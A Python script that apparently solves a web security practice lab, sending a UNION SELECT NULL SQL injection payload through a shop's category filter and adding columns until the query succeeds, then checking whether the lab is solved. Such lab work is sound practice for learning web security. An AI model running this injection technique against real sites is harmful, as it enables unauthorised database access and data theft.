import sys
import logging
import argparse
import urllib3

import requests

import utils
from shop import Shop

log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}] [{levelname}] [{name}] {message}",
    style="{", 
    datefmt="%H:%M:%S",
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def main(args):
    shop = Shop(args.url, args.no_proxy)
    nulls_list = ["NULL"]
    while True:
        nulls = ",".join(nulls_list)
        filter_path = f"filter?category=' UNION SELECT {nulls}-- "
        exploit_url = shop.base_url + filter_path
        if args.no_proxy:
            resp = requests.get(exploit_url)
        else:
            resp = requests.get(exploit_url, proxies=utils.PROXIES, verify=False)
        if resp.status_code == 200:
            break
        if len(nulls_list) > 50:
            log.error("Could not determine number of columns, > 50.")
            sys.exit(-1)
        nulls_list.append("NULL")        
    log.info(f"Number of columns is : {len(nulls_list)}")
    shop.is_solved()
    
if __name__ == "__main__":
    args=utils.parse_args(sys.argv)
    main(args)